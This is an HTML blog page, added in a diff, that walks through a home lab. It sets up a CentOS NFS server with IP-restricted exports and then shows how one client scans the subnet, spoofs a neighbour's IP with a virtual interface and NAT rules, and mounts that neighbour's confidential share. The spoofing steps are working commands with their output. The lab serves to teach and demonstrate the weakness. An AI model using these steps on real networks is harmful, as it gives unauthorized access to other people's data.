@@ -1,0 +1,493 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>InterCloudZone</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
+<link href="google-code-prettify/sunburst.css" type="text/css" rel="stylesheet" />
+
+<!--[if IE]>
+<style type="text/css">
+#sidebar #calendar {
+	background-position: 0px 20px;
+}
+</style>
+<![endif]-->
+
+<script src="http://www.google.com/jsapi" type="text/javascript"></script>
+<script type="text/javascript">google.load("jquery", "1.3.2");</script>
+<script type="text/javascript" src="/google-code-prettify/prettify.js?autoload=true&;lang=css;skin=sunburst""></script>
+<script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js?autoload=true&amp;lang=css&amp;skin=sunburst"></script>
+</head>
+<body>
+<div id="logo">
+	<h1> InterCloudZone.com </h1>
+</div>
+<div id="menu">
+	<ul>
+		<li class="first"><a href="http://www.intercloudzone.com" accesskey="1" title="">Home</a></li>
+		<li><a href="http://sourceforge.net/projects/oraclerman/" accesskey="2" title="">OpenSource</a></li>
+		<li><a href="http://padmavyuha.blogspot.com/" accesskey="3" title="">Blogs</a></li>
+		<li><a href="http://www.linkedin.com/in/baburajkallarakkal" accesskey="4" title="">Profile</a></li>
+	</ul>
+	 
+</div>
+<hr />
+<!-- div id="banner"><img src="images/img09.jpg" alt="" width="960" height="147" / ></div -->
+<!-- start page -->
+
+<div id="swift-page" class="default-page" >
+	<!-- start content -->
+	<h2 class="title"> Hacking NFS data from other systems using NAT (Network-Address-Translation)</h2>
+
+<p> 
+	Goal is to setup a NFS Server (RBNETOPS) and provide sharemount access to clients - RBNETAPP and RBNETLAB
+</p>
+
+<p>	
+	Access will be setup such that RBNETAPP and RBNETLAB can only see their own mount points.	
+</p>
+
+<p> 
+	RBNETLAB, say then maliciously sniff on neighbors using network scans and with the ability of virtual IP's finds and access the restricted mount point setup 
+	for RBNETAPP there by hacking into someone elses data.
+</p>
+
+<p> 
+	For this excersize so we need 3 VM"s - one central NFS server -  RBNETOPS. Set that up first.
+	Install NFS RPMs, enable them and start the services
+</p> 
+	
+<pre>
+
+yum install nfs-utils -y
+yum install rpcbind -y
+
+
+systemctl enable rpcbind
+systemctl enable nfs-server
+
+systemctl start rpcbind
+systemctl start nfs-server
+
+	
+</pre>				 
+				
+
+<p> 
+Create NFS Share Parition/Directory using LVMs.
+<p/>
+
+<p> 
+I have a 2nd VDISK attached 100GB (sdb), using LVM's wanted to set aside 25GB for the NFS Share
+<p/>
+
+<pre>
+
+[root@rbnetops network-scripts]# cat /proc/partitions
+major minor  #blocks  name
+
+  11        0    1048575 sr0
+   8       32  104857600 sdc
+   8       33    4881408 sdc1
+   8       16  104857600 sdb
+...
+
+
+[root@rbnetops network-scripts]# pvcreate /dev/sdb
+  Physical volume "/dev/sdb" successfully created
+
+[root@rbnetops network-scripts]# vgcreate vgDATA00 /dev/sdb
+  Volume group "vgDATA00" successfully created
+
+[root@rbnetops network-scripts]# lvcreate -L 25G -n lvDATA00 vgDATA00
+  Logical volume "lvDATA00" created
+
+[root@rbnetops network-scripts]# pvs
+  PV         VG       Fmt  Attr PSize   PFree
+  /dev/sda2  centos   lvm2 a--   79.51g     0
+  /dev/sdb   vgDATA00 lvm2 a--  100.00g 75.00g
+[root@rbnetops network-scripts]# vgs
+  VG       #PV #LV #SN Attr   VSize   VFree
+  centos     1   3   0 wz--n-  79.51g     0
+  vgDATA00   1   1   0 wz--n- 100.00g 75.00g
+
+[root@rbnetops network-scripts]# lvs
+  LV       VG       Attr       LSize  Pool Origin Data%  Move Log Cpy%Sync Convert
+  home     centos   -wi-ao---- 26.48g
+  root     centos   -wi-ao---- 50.00g
+  swap     centos   -wi-ao----  3.03g
+  lvDATA00 vgDATA00 -wi-a----- 25.00g
+
+So basically lvDATA00 is the one that I want to carve out for NFS Share.
+
+[root@rbnetops network-scripts]# mkdir -pv /u01/data
+mkdir: created directory â/u01â
+mkdir: created directory â/u01/dataâ
+
+[root@rbnetops network-scripts]# cat /etc/fstab |grep vgDATA
+/dev/mapper/vgDATA00-lvDATA00   /u01/data       ext3    defaults        0 0
+
+[root@rbnetops network-scripts]# mount -a
+[root@rbnetops network-scripts]# mount -l | grep vgDATA
+/dev/mapper/vgDATA00-lvDATA00 on /u01/data type ext3 (rw,relatime,seclabel,data=ordered)
+
+
+
+</pre>
+
+<p> 
+
+RBNETAPP and RBNETLAB are two systems that are going to be used as NFS Clients, so create 
+separate directories for them in RBNETOPS.
+
+</p>
+ 
+<pre>
+[root@rbnetops data]# mkdir nfsshare_rbnetapp
+[root@rbnetops data]# mkdir nfsshare_rbnetlab
+
+</pre>	
+	
+<p> 		
+Create Shares for exporting to clients.	
+</p>
+
+<pre>
+
+
+[root@rbnetapp network-scripts]# ifconfig enp0s8 | grep -w inet | awk '{print $2}'
+192.168.2.152
+
+
+[root@rbnetlab network-scripts]# ifconfig enp0s8 | grep -w inet | awk '{print $2}'
+192.168.2.153
+
+
+[root@rbnetops data]# cat /etc/exports
+/u01/data/nfsshare_rbnetapp 192.168.2.152(rw,sync,no_root_squash,no_all_squash)
+/u01/data/nfsshare_rbnetlab 192.168.2.153(rw,sync,no_root_squash,no_all_squash)
+
+[root@rbnetops data]# systemctl restart nfs-server
+
+[root@rbnetops data]# exportfs -a
+
+[root@rbnetops data]# showmount -e
+Export list for rbnetops.intercloudzone.com:
+/u01/data/nfsshare_rbnetlab 192.168.2.153
+/u01/data/nfsshare_rbnetapp 192.168.2.152
+
+</pre>	
+
+
+<p> 
+		Configure the NFS clients (RBNTEAPP & RBNETLAB )
+		
+</p>
+
+<pre>
+
+
+yum install nfs-utils -y
+yum install rpcbind -y
+
+
+systemctl enable rpcbind
+systemctl enable nfs-server
+
+systemctl start rpcbind
+systemctl start nfs-server
+
+	
+</pre>	
+
+
+<p> 
+	
+Starting with CentOS/Redhat  7.x the firewall mechanism has changed. firewalld is what's used for setting up
+the legacy iptables/ebtables rules. By default firewalld uses the 'DEFAULT zone' and we need to explicitly 
+enable the 'nfs' service so that the NFS ports are accessible from the clients.
+
+	
+</p>
+
+
+<pre>
+ 
+[root@rbnetops data]# firewall-cmd --permanent --zone=public --add-service=nfs
+success
+
+[root@rbnetops data]# firewall-cmd --reload
+success
+
+
+</pre>	
+	
+
+<p> 
+	Create a directory and perform the NFS mount.
+	 
+</p>
+
+
+<pre>
+
+[root@rbnetapp network-scripts]# mkdir -pv /u01/nfsdata
+mkdir: created directory â/u01â
+mkdir: created directory â/u01/nfsdataâ
+
+
+[root@rbnetapp network-scripts]# mount -t nfs 192.168.2.151:/u01/data/nfsshare_rbnetapp /u01/nfsdata/ -v
+mount.nfs: timeout set for Wed Apr  1 18:51:25 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.152'
+
+[root@rbnetapp network-scripts]# df -h
+Filesystem                                 Size  Used Avail Use% Mounted on
+/dev/mapper/centos-root                     50G  3.8G   47G   8% /
+devtmpfs                                   741M     0  741M   0% /dev
+tmpfs                                      750M   80K  750M   1% /dev/shm
+tmpfs                                      750M  8.7M  741M   2% /run
+tmpfs                                      750M     0  750M   0% /sys/fs/cgroup
+/dev/mapper/centos-home                     28G   33M   28G   1% /home
+/dev/sda1                                  497M  118M  379M  24% /boot
+192.168.2.151:/u01/data/nfsshare_rbnetapp   25G   45M   24G   1% /u01/nfsdata
+
+[root@rbnetlab ~]# mkdir -pv /u01/nfsdata
+mkdir: created directory â/u01â
+mkdir: created directory â/u01/nfsdataâ
+
+[root@rbnetlab ~]# mount -t nfs 192.168.2.151:/u01/data/nfsshare_rbnetlab /u01/nfsdata/ -v
+mount.nfs: timeout set for Thu Apr  2 13:27:59 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.153'
+
+
+</pre>	
+	
+	
+<p> 
+Create a file and add some confidential data.
+</p>
+
+<pre>
+
+[root@rbnetlab ~]# mount -t nfs 192.168.2.151:/u01/data/nfsshare_rbnetlab /u01/nfsdata/ -v
+mount.nfs: timeout set for Thu Apr  2 13:27:59 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.153'
+
+[root@rbnetlab nfsdata]# echo "Confidential created @ `hostname -f`" > `hostname -s`.dat
+[root@rbnetlab nfsdata]# cat rbnetlab.dat
+Confidential created @ rbnetlab
+
+</pre>	
+
+<p> 
+To recap - neither RBNETAPP nor RBNETLAB can see each others data due to the restriction placed at the NFS server, only 	.152 can mount _rbnetapp directory and .153 can mount _rbnetlab.
+</p>
+
+<pre>
+
+[root@rbnetops data]# cat /etc/exports
+/u01/data/nfsshare_rbnetapp 192.168.2.152(rw,sync,no_root_squash,no_all_squash)
+/u01/data/nfsshare_rbnetlab 192.168.2.153(rw,sync,no_root_squash,no_all_squash)
+	
+</pre>	
+
+<p> 		
+Let's suppose RBNETLAB is a malicious host, with a simple nmap scan he can identify the hosts and open ports on the same subnet.
+
+</p>
+
+<pre>
+
+
+[root@rbnetlab nfsdata]# nmap 192.168.2.0/24 -sP
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-02 13:36 EDT
+Nmap scan report for 192.168.2.1
+Host is up (0.00037s latency).
+MAC Address: 00:15:9A:C8:19:1F (Motorola Mobility)
+Nmap scan report for rbnetops (192.168.2.151)
+Host is up (-0.10s latency).
+MAC Address: 08:00:27:CB:B5:03 (Cadmus Computer Systems)
+Nmap scan report for rbnetapp (192.168.2.152)
+Host is up (-0.10s latency).
+MAC Address: 08:00:27:85:30:EB (Cadmus Computer Systems)
+Nmap scan report for rbdnsax (192.168.2.160)
+Host is up (0.00019s latency).
+MAC Address: 08:00:27:CE:BE:3C (Cadmus Computer Systems)
+Nmap scan report for rbnetlab (192.168.2.153)
+Host is up.
+..
+Nmap done: 256 IP addresses (7 hosts up) scanned in 8.70 seconds
+...
+
+OUTPUT trimmed..
+
+</pre>	
+		
+		
+<p> 
+ 	Let's say RBNETLAB makes the best guess and wanted to attempt to try mounting the FS and he makes
+	a best guess that the FS would be /u01/data/nfsshare_rbnetapp (comparing his on NFS share).
+	First thing required is to setup a VIP and by default bind sockets to a non-local ip address may be turned off - so enable that.
+</p>
+ 
+<pre>
+
+sysctl net.ipv4.ip_nonlocal_bind
+net.ipv4.ip_nonlocal_bind = 0
+
+sysctl net.ipv4.ip_nonlocal_bind=1
+net.ipv4.ip_nonlocal_bind = 1
+
+</pre>	
+
+<p> 
+ 	Spin up a VIP on the same enp0s8 interface with RBNETAPP's IP address and enable packet forwarding.
+</p>
+ 
+<pre>
+
+ifconfig enp0s8:1 192.168.2.152 netmask 255.255.255.0 up
+
+[root@rbnetlab ~]# ifconfig
+enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+		inet 192.168.56.153  netmask 255.255.255.0  broadcast 192.168.56.255
+		inet6 fe80::a00:27ff:fe6f:c7cc  prefixlen 64  scopeid 0x20<link>
+		ether 08:00:27:6f:c7:cc  txqueuelen 1000  (Ethernet)
+		RX packets 98  bytes 12407 (12.1 KiB)
+		RX errors 0  dropped 0  overruns 0  frame 0
+		TX packets 25  bytes 3943 (3.8 KiB)
+		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+		inet 192.168.2.153  netmask 255.255.255.0  broadcast 192.168.2.255
+		inet6 fe80::a00:27ff:feb3:8bb2  prefixlen 64  scopeid 0x20<link>
+		ether 08:00:27:b3:8b:b2  txqueuelen 1000  (Ethernet)
+		RX packets 19060  bytes 5407780 (5.1 MiB)
+		RX errors 0  dropped 0  overruns 0  frame 0
+		TX packets 18666  bytes 1260218 (1.2 MiB)
+		TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+enp0s8:1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+		inet 192.168.2.152  netmask 255.255.255.0  broadcast 192.168.2.255
+		ether 08:00:27:b3:8b:b2  txqueuelen 1000  (Ethernet)
+		
+
+[root@rbnetlab ~]# echo "1" > /proc/sys/net/ipv4/ip_forward
+	
+</pre>	
+
+
+<p> 
+ 	This part is the most crucial thing. 
+	
+	Create passthrough firewall rules on the nat table to do both SNAT and DNAT. Passthrough is the way 
+	you can define the rules like the way we used to setup iptable rules.
+	
+</p>
+ 
+<pre>
+
+firewall-cmd --direct --passthrough ipv4 -t nat -I POST_public -s 192.168.2.153 -j SNAT --to 192.168.2.152
+firewall-cmd --direct --passthrough ipv4 -t nat -I PRE_public -s 192.168.2.152 -j DNAT --to 192.168.2.153
+
+</pre>	
+
+<p> 
+  Now let's try the interesting part. Attempt to do a mount of RBNETAPP's share on RBNETLAB. You can see 
+  with NAT rules and VIP - RBNETOPS thinks that the request is indeed coming from 192.168.2.152 IP address where in-effect 
+  it's coming from RBNETLAB.
+  
+</p>
+ 
+<pre>
+
+[root@rbnetlab ~]#  mount -t nfs -o addr=192.168.2.152 rbnetops:/u01/data/nfsshare_rbnetapp /u01/hackit/  -v
+mount.nfs: timeout set for Thu Apr  9 18:10:27 2015
+mount.nfs: trying text-based options 'vers=4,addr=192.168.2.151,clientaddr=192.168.2.153'
+
+[root@rbnetlab ~]# cd /u01/hackit/
+
+[root@rbnetlab hackit]# ls -ltr
+total 4
+-rw-r--r--. 1 root root 32 Apr  2 13:24 rbnetapp.dat
+
+[root@rbnetlab hackit]# cat rbnetapp.dat
+Confidential created @ rbnetapp
+
+</pre>	
+
+<p> 
+ 		For the purpose of refence I'm including the output of iptable to show the NAT rules.
+</p>
+ 
+<pre>
+
+[root@rbnetlab ~]# iptables -L --line -t nat
+Chain PREROUTING (policy ACCEPT)
+num  target     prot opt source               destination
+1    PREROUTING_direct  all  --  anywhere             anywhere
+2    PREROUTING_ZONES_SOURCE  all  --  anywhere             anywhere
+3    PREROUTING_ZONES  all  --  anywhere             anywhere
+
+......
+Chain POST_public (3 references)
+num  target     prot opt source               destination
+1    SNAT       all  --  rbnetlab             anywhere             to:192.168.2.152
+2    POST_public_log  all  --  anywhere             anywhere
+3    POST_public_deny  all  --  anywhere             anywhere
+4    POST_public_allow  all  --  anywhere             anywhere
+
+.....
+Chain PRE_public (3 references)
+num  target     prot opt source               destination
+1    DNAT       all  --  rbnetapp             anywhere             to:192.168.2.153
+2    PRE_public_log  all  --  anywhere             anywhere
+3    PRE_public_deny  all  --  anywhere             anywhere
+4    PRE_public_allow  all  --  anywhere             anywhere
+
+Chain PRE_public_allow (1 references)
+num  target     prot opt source               destination
+
+Chain PRE_public_deny (1 references)
+num  target     prot opt source               destinatio
+
+....
+</pre>	
+
+<p> 
+ 	
+	There is a way to securely block this attempt. Not through iptables/firewall-cmd as 
+	we have to get to DataLink layer of packet filtering. That's where the beauty of ebtables
+	comes into play.
+	
+</p>
+
+<p>
+	I shall try to post that article soon.
+</p>
+
+<p>
+	Hope you enjoyed reading.. Thanks for visiting the site.
+
+</p>
+  
+<script>$( "pre" ).addClass( "prettyprint" );</script>	
+	
+	<div id="content">
+	<!-- end content -->
+	</div>
+<!-- end page -->
+<div id="footer">
+	<p class="legal">Copyright (c) 2015 InterCloudZone.com. All rights reserved.</p>
+</div>
+
+
+
+</body>
+
+</html>
